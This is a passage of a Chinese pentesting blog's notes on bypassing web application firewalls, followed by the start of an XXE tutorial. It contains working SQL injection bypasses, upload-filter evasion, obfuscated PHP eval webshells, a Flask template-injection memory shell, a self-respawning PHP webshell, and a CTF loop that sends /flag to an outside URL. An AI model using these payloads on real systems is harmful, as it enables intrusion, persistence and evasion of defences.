class="line">X-FORWARDED-FOR等</span><br></pre></td></tr></table></figure></li><li><p>UA白名单</p><blockquote><p>某些WAF可能为了不影响站点的SEO优化，将User-Agent为某些搜索引擎（如谷歌）的请求当作白名单处理，不检测和拦截。</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">User-Agent</span><br></pre></td></tr></table></figure><p>UA收集：<a href="https://www.0735.pro/archives/study/51.html">https://www.0735.pro/archives/study/51.html</a></p></li></ul><h5 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h5><p>一些 WAF 为了减少服务器的压力，会对静态文件如<code>.png</code>、<code>.css</code>等直接放行，那么我们可以尝试伪装成静态文件来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h5><ol><li>一些 WAF 对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</li><li>一些 WAF 检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</li></ol><h5 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h5><blockquote><p>fuzz大法，使用脚本去探测WAF设备对于字符处理是否有异常，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass</p></blockquote><p>测试点</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）：get请求处 </span><br><span class="line">2）：header请求处 </span><br><span class="line">3）：post urlencode内容处 </span><br><span class="line">4）：post form-data内容处</span><br></pre></td></tr></table></figure><p>基础内容</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）编码过的0-255字符 </span><br><span class="line">2）进行编码的0-255字符 </span><br><span class="line">3）utf gbk字符</span><br></pre></td></tr></table></figure><h3 id="正面硬刚"><a href="#正面硬刚" class="headerlink" title="正面硬刚"></a>正面硬刚</h3><blockquote><p>增增改改混淆视听，使waf的规则和策略失效</p><p><strong>基本方针</strong>：</p><ol><li>增删测试waf容忍度，确认关键点</li><li>本地FUZZ PAYLOAD,先保证可以绕过检测</li><li>再次进行构造使得后端能够进行解析</li></ol></blockquote><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>简单fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>可以发现不会对单一的关键字进行过滤，会对一些组合进行过滤</p><h5 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a><code>union select</code>绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #注释换行</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>在<code>/**/</code>中插入<code>/x/</code>即可，x至少为一个字符</p><h5 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZ结果</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h5 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h5><p>硬刚G</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分块传输，脏数据等成功</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="waf检测内容"><a href="#waf检测内容" class="headerlink" title="waf检测内容"></a>waf检测内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求的url</span><br><span class="line">Boundary边界</span><br><span class="line">MIME类型</span><br><span class="line">文件后缀名</span><br><span class="line">文件头</span><br><span class="line">文件内容</span><br><span class="line">访问流量</span><br></pre></td></tr></table></figure><h5 id="文件上传数据包"><a href="#文件上传数据包" class="headerlink" title="文件上传数据包"></a>文件上传数据包</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl 定义了BODY中的分界线(因为是谷歌浏览器，所以分界线为----WebKitFormBoundary加上随机字符串)</span><br><span class="line"></span><br><span class="line">--boundary</span><br><span class="line"></span><br><span class="line">--boundary   <span class="comment"># 每两个分界线之间是具体的内容：文件上传，post参数</span></span><br><span class="line"></span><br><span class="line">--boundary--  <span class="comment"># 结束标志</span></span><br></pre></td></tr></table></figure><h5 id="安全🐕测试"><a href="#安全🐕测试" class="headerlink" title="安全🐕测试"></a>安全🐕测试</h5><ul><li><p>不允许php后缀上传</p></li><li><p>上传时，不检查文件内容</p></li><li><p>访问时，不允许访问含有恶意内容的php文件</p></li></ul><h6 id="绕过后缀"><a href="#绕过后缀" class="headerlink" title="绕过后缀"></a>绕过后缀</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=a</span><br><span class="line"></span><br><span class="line">增加多个boundary</span><br><span class="line">php：可以在boundary前后添加任意字符</span><br><span class="line">大小写</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">操作：</span><br><span class="line">大小写</span><br><span class="line">Content-Disposition 任意位置换行,空格，脏数据溢出，多个Content-Disposition，form-data（删除，改为*）</span><br><span class="line">多个filename，多个;</span><br><span class="line">文件名单双引号数量</span><br><span class="line">content-type（增删，设置charset）</span><br><span class="line">多个BODY</span><br><span class="line">多个boundary</span><br><span class="line">交换name和filename的顺序</span><br><span class="line">排列组合</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: </span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: compress</span><br><span class="line">Accept-Encoding: deflate</span><br><span class="line">Accept-Encoding: br</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br></pre></td></tr></table></figure><p>Windows</p><ul><li>NTFS 流</li></ul><p>  <a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">文件流 (本地文件系统) - Win32 apps | Microsoft Learn</a></p><p>  fuzz可以的</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>  <img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p>  <img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><ul><li><p>文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件名尾加任意个. 或者任意个空格（对文件名无影响）</span><br><span class="line"></span><br><span class="line">windows文件名的保留字符（不允许出现）</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string">可以尝试在文件名后加上这些字符</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当filename=shell.php:.jpg</span><br><span class="line">结果：</span><br><span class="line">可以上传shell.php，但是会吃掉文件内容。。。</span><br><span class="line">其他的要不不可以，可以的话，上传的文件名为.jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><ul><li><p>文件名长度</p><p>截断超长文件名</p><p>windows文件名</p><p><img src="/../images/image-20230618171438236.png" alt="image-20230618171438236"></p><p>linux文件名：linux中文件名最长为255字符，文件路径最大长度为4096字符</p><p>如果后端脚本没有限制上传文件名长度，可以通过多次测试，上传名为aaaaa…(200+).php.jpg，把最后的.jpg挤出去。</p></li></ul><p><strong>部分成功的，好绕</strong></p><p>waf是解析最后一个参数，最后一个;后面的，但是如果最后一个；后面没有参数，</p><p>后端就取前一个,waf识别到空</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># 双引号不行</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">除了shell.php处，其他地方加换行，或脏数据都可</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>删除<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>增加<code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>安全🐕+代码白名单（后缀只允许图片）</p><p>上面任意一个绕过（除了；绕过）+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h6 id="绕过文件内容检测–免杀"><a href="#绕过文件内容检测–免杀" class="headerlink" title="绕过文件内容检测–免杀"></a>绕过文件内容检测–免杀</h6><p>安全🐕的内容检测随便改一下就过了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="绕过流量"><a href="#绕过流量" class="headerlink" title="绕过流量"></a>绕过流量</h6><p>测试时</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#命令执行限制</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>对流量进行一个<code>base64</code>加密即可</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑</p><p>编码器</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>选择编码器</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h5 id="webshell免杀"><a href="#webshell免杀" class="headerlink" title="webshell免杀"></a>webshell免杀</h5><ul><li>waf检测</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内容、创建日期、文件大小、通信流量特征</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于静态引擎的绕过，可以通过拆分关键词、</span><br><span class="line">加入能够引发解析干扰的畸形字符等;</span><br><span class="line"></span><br><span class="line">而对于动态引擎，需要分析它跟踪了哪些输入</span><br><span class="line">点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则</span><br></pre></td></tr></table></figure><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">简单理解污点分析技术 | K0rz3n’s Blog</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">另类的入口</span><br><span class="line">各种混淆（编码加密，进制转换，反序列化...）</span><br><span class="line">符号干扰，绕过正则，拼接null,\n,\r,\t等</span><br><span class="line">信息差绕过（加入外部因素后才是webshel，量子WEBshell😋）比如截取文件名，目录名，传入随机数种子等</span><br></pre></td></tr></table></figure><ul><li>传统webshell</li></ul><p>学习：</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShell通用免杀的思考 - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>代码审计知识星球</p><p>收集：</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><ul><li>无文件落地–内存马</li></ul><p>python</p><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p>通过注册路由处理来实现注入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask 1.x 是可以的</span></span><br><span class="line">?name=&#123;&#123;get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/khaz&#x27;, &#x27;khaz&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;cmd&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/khaz?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531192216503.png" alt="image-20230531192216503"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 僵尸进程 记得编码</span></span><br><span class="line">system(<span class="string">&quot;python3 -c \&quot;while 1:exec(\\\&quot;flag=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[:-1];print(flag);io=__import__(&#x27;requests&#x27;).get(&#x27;https://ctf.bugku.com/pvp/submit.html?token=67c0d48c49a89cc434b2f95da944e759&amp;flag=&#x27;+flag);print(io.content);__import__(&#x27;time&#x27;).sleep(600);\\\&quot;);\&quot; &amp; &quot;</span>);</span><br></pre></td></tr></table></figure><p>僵尸进程 ： 子进程先于父进程退出，父进程又没有处理子进程的退出状态，此时子进程就会称为僵尸进程。</p><p>父进程通过<code>sleep(600)</code>保证子进程优先于父进程退出</p><p><a href="https://blog.csdn.net/Freshduke/article/details/111544319">(77条消息) python僵尸进程的产生和僵尸进程自动处理_pipe导致僵尸进程_Jimmy-TONG的博客-CSDN博客</a></p><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;snert.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过内存马启动后删除文件本身之前，使代码在内存中执行死循环，使管理员无法删除内存马，达到权限维持的目的。</p><p>JAVA</p><p>放在java安全里吧</p><h5 id="流量绕过"><a href="#流量绕过" class="headerlink" title="流量绕过"></a>流量绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弱特征：HTTP Header</span><br><span class="line">request和response内容</span><br></pre></td></tr></table></figure><p>参考之前HW看的文章</p><ul><li><p>哥斯拉</p><p><a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业门户</a></p></li><li><p>冰蝎</p><p><a href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇 - 先知社区</a></p><p><a href="https://www.secpulse.com/archives/195173.html">冰蝎V4.0流量分析到攻防检测 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/12453">冰蝎4.0自定义加密 - 先知社区</a></p></li><li><p>蚁剑</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/368">https://xz.aliyun.com/t/368</a></p><p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p><p>[Bypass WAF Cookbook - MayIKissYou](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">https://www.anquanke.com/post/id/203880</a></p><p><a href="https://xz.aliyun.com/t/11607#toc-1">玄武盾的几种绕过姿势 - 先知社区</a></p><h2 id="好文收集"><a href="#好文收集" class="headerlink" title="好文收集"></a>好文收集</h2><p><a href="https://xz.aliyun.com/t/12089">记一次阿里云伏魔引擎-多功能场景绕过测试 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/06/01/XXE/"/>
      <url>/2023/06/01/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li><p>定义</p><blockquote><p>XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。</p></blockquote></li><li><p>与html的联系和区别</p><ul><li>HTML 被设计用来显示数据</li><li>XML 被设计用来传输和存储数据</li></ul><blockquote><p>对 XML 最好的描述是：</p><p><strong>XML 是独立于软件和硬件的信息传输工具。</strong></p></blockquote></li><li><p>语法</p><p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p></li><li><p>格式</p><ul><li><p>XML声明：版本，编码信息（可选，如果存在就必须放在文档的首行）</p></li><li><p>DTD:Document Type Definition 即文档类型定义 (可选)</p></li><li><p>文档元素</p></li><li><p>典型xml文档例子</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p></li></ul></li></ol><h2 id="DTD与实体"><a href="#DTD与实体" class="headerlink" title="DTD与实体"></a>DTD与实体</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>上面所示的就是一个DTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;外部dtd地址&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>上面所示的就是一个外部DTD</p><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><blockquote><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>文档元素可以使用&amp;来引用实体的值，<code>&amp;hello</code>将被替换为<code>hello world</code></p><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>XML参数实体是一种特殊的XML实体，只能在DTD中的其他地方引用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>可以看到参数实体用<code>% name</code>声明，引用时用<code>%name;</code></p><h4 id="引入外部实体"><a href="#引入外部实体" class="headerlink" title="引入外部实体"></a>引入外部实体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>这里使用了file协议来引入外部实体，实际上还能支持如下协议，这也是xxe漏洞形成的原因</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" 